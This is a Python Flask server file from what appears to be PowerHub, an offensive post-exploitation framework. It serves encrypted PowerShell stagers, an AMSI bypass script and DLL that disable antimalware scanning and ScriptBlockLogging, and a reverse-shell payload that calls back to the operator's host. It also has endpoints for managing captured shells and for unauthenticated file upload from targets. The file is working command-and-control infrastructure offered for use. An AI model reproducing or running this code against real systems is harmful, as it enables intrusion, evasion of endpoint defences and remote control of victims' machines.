from base64 import b64encode
from datetime import datetime
import os
import shutil
from tempfile import TemporaryDirectory

from flask import Flask, render_template, request, Response, redirect, \
         send_from_directory, flash, make_response, abort
from werkzeug.serving import WSGIRequestHandler, _log

from powerhub.clipboard import clipboard as cb
from powerhub.stager import modules, stager_str, callback_url, \
        import_modules, webdav_url
from powerhub.upload import save_file, get_filelist
from powerhub.directories import UPLOAD_DIR, BASE_DIR
from powerhub.tools import encrypt, compress, key
from powerhub.auth import requires_auth
from powerhub.repos import repositories, install_repo
from powerhub.obfuscation import symbol_name
from powerhub.receiver import ShellReceiver
from powerhub.args import args


app = Flask(__name__)
app.secret_key = os.urandom(16)

shell_receiver = ShellReceiver()

need_proxy = True
need_tlsv12 = (args.SSL_KEY is not None)


class MyRequestHandler(WSGIRequestHandler):
    def log(self, type, message, *args):
        # don't log datetime again
        _log(type, '%s %s\n' % (self.address_string(), message % args))


def run_flask_app():
    app.run(
        debug=args.DEBUG,
        use_reloader=False,
        port=args.FLASK_PORT,
        host='127.0.0.1',
        request_handler=MyRequestHandler,
    )


@app.route('/')
@requires_auth
def index():
    return redirect('/hub')


@app.route('/hub')
@requires_auth
def hub():
    context = {
        "dl_str": stager_str(need_proxy=need_proxy,
                             need_tlsv12=need_tlsv12),
        "modules": modules,
        "repositories": list(repositories.keys()),
        "SSL": args.SSL_KEY is not None,
    }
    return render_template("hub.html", **context)


@app.route('/receiver')
@requires_auth
def receiver():
    context = {
        "dl_str": stager_str(flavor='reverse_shell',
                             need_proxy=need_proxy,
                             need_tlsv12=need_tlsv12),
        "SSL": args.SSL_KEY is not None,
        "shells": shell_receiver.active_shells(),
    }
    return render_template("receiver.html", **context)


@app.route('/clipboard')
@requires_auth
def clipboard():
    context = {
        "clipboard": cb,
    }
    return render_template("clipboard.html", **context)


@app.route('/fileexchange')
@requires_auth
def fileexchange():
    context = {
        "files": get_filelist(),
    }
    return render_template("fileexchange.html", **context)


@app.route('/css/<path:path>')
def send_css(path):
    return send_from_directory('static/css', path)


@app.route('/js/<path:path>')
def send_js(path):
    return send_from_directory('static/js', path)


@app.route('/img/<path:path>')
def send_img(path):
    return send_from_directory('static/img', path)


@app.route('/clipboard/add', methods=["POST"])
@requires_auth
def add_clipboard():
    """Add a clipboard entry"""
    content = request.form.get("content")
    cb.add(
        content,
        datetime.utcnow(),
        request.remote_addr
    )
    return redirect('/clipboard')


@app.route('/clipboard/delete', methods=["POST"])
@requires_auth
def del_clipboard():
    """Delete a clipboard entry"""
    n = int(request.form.get("n")) - 1
    cb.delete(n)
    return redirect('/')


@app.route('/m')
def payload_m():
    """Load a single module"""
    if 'm' not in request.args:
        return Response('error')
    n = int(request.args.get('m'))
    if n < len(modules):
        modules[n].activate()
        if 'c' in request.args:
            resp = b64encode(encrypt(compress(modules[n].code), key)),
        else:
            resp = b64encode(encrypt(modules[n].code, key)),
        return Response(
            resp,
            content_type='text/plain; charset=utf-8'
        )
    else:
        return Response("not found")


@app.route('/0')
def payload_0():
    """Load 0th stage"""
    encrypted_strings = [
        "Bypass.AMSI",
        "System.Management.Automation.Utils",
        "cachedGroupPolicySettings",
        "NonPublic,Static",
        "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",  # noqa
        "EnableScriptBlockLogging",
    ]
    encrypted_strings = [b64encode(encrypt(x.encode(), key)).decode() for x
                         in encrypted_strings]
    context = {
        "modules": modules,
        "callback_url": callback_url,
        "key": key,
        "strings": encrypted_strings,
        "symbol_name": symbol_name,
        "stage2": 'r' if 'r' in request.args else '1',
    }
    result = render_template(
                    "amsi.ps1",
                    **context,
                    content_type='text/plain'
    )
    return result


@app.route('/1')
def payload_1():
    """Load 1st stage"""
    context = {
        "modules": modules,
        "webdav_url": webdav_url,
        "symbol_name": symbol_name,
    }
    result = render_template(
                    "payload.ps1",
                    **context,
    ).encode()
    result = b64encode(encrypt(result, key))
    return Response(result, content_type='text/plain; charset=utf-8')


@app.route('/l')
def payload_l():
    """Load the AMSI Bypass DLL"""
    # https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html  # noqa

    filename = os.path.join(BASE_DIR, 'binary', 'amsi.dll')
    with open(filename, 'rb') as f:
        DLL = f.read()
    DLL = b64encode(encrypt(b64encode(DLL), key))
    return Response(DLL, content_type='text/plain; charset=utf-8')


@app.route('/dlcradle')
def dlcradle():
    global need_proxy, need_tlsv12
    need_proxy = request.args['proxy'] == 'true'
    need_tlsv12 = request.args['tlsv12'] == 'true'
    return stager_str(need_proxy=need_proxy, need_tlsv12=need_tlsv12)


@app.route('/u', methods=["POST"])
def upload():
    """Upload one or more files"""
    file_list = request.files.getlist("file[]")
    noredirect = "noredirect" in request.args
    for file in file_list:
        if file.filename == '':
            return redirect(request.url)
        if file:
            save_file(file)
    if noredirect:
        return ""
    else:
        return redirect('/fileexchange')


@app.route('/d/<path:filename>')
@requires_auth
def download_file(filename):
    """Download a file"""
    try:
        return send_from_directory(UPLOAD_DIR,
                                   filename,
                                   as_attachment=True)
    except PermissionError:
        abort(403)


@app.route('/d-all')
@requires_auth
def download_all():
    """Download archive of all uploaded files"""
    tmp_dir = TemporaryDirectory()
    file_name = "powerhub_upload_export_" + \
                datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    shutil.make_archive(os.path.join(tmp_dir.name, file_name),
                        "zip",
                        UPLOAD_DIR)
    return send_from_directory(tmp_dir.name,
                               file_name + ".zip",
                               as_attachment=True)


@app.route('/getrepo', methods=["POST"])
@requires_auth
def get_repo():
    """Download a specified repository"""
    msg, msg_type = install_repo(
        request.form['repo'],
        request.form['custom-repo']
    )
    # possible types: success, info, danger, warning
    flash(msg, msg_type)
    return redirect('/hub')


@app.route('/reload', methods=["POST"])
@requires_auth
def reload_modules():
    """Reload all modules from disk"""
    try:
        global modules
        modules = import_modules()
        flash("Modules reloaded (press F5 to see them)", "success")
    except Exception as e:
        flash("Error while reloading modules: %s" % str(e), "danger")
    return render_template("messages.html")


@app.route('/r', methods=["GET"])
def reverse_shell():
    """Spawn a reverse shell"""
    context = {
        "dl_cradle": stager_str().replace('$K', '$R'),
        "IP": args.URI_HOST,
        "delay": 10,  # delay in seconds
        "lifetime": 3,  # lifetime in days
        "PORT": str(args.REC_PORT),
    }
    result = render_template(
                    "reverse-shell.ps1",
                    **context,
    ).encode()
    result = b64encode(encrypt(result, key))
    return Response(result, content_type='text/plain; charset=utf-8')


@app.route('/shell-log', methods=["GET"])
def shell_log():
    shell_id = request.args['id']
    if 'content' in request.args:
        content = request.args['content']
    else:
        content = 'html'
    shell = shell_receiver.get_shell_by_id(shell_id)
    log = shell.get_log()
    context = {
        'log': log,
        'content': content,
    }
    if content == 'html':
        return render_template("shell-log.html", **context)
    elif content == 'raw':
        response = make_response(render_template("shell-log.html",
                                 **context))
        response.headers['Content-Disposition'] = \
            'attachment; filename=' + shell_id + ".log"
        response.headers['content-type'] = 'text/plain; charset=utf-8'
        return response


@app.route('/kill-shell', methods=["POST"])
def shell_kill():
    shell_id = request.form.get("shellid")
    shell = shell_receiver.get_shell_by_id(shell_id)
    shell.kill()
    return ""


@app.route('/forget-shell', methods=["POST"])
def shell_forget():
    shell_id = request.form.get("shellid")
    shell_receiver.forget_shell(shell_id)
    return ""


@app.route('/kill-all', methods=["POST"])
def shell_kill_all():
    for shell in shell_receiver.active_shells():
        shell.kill()
    return ""
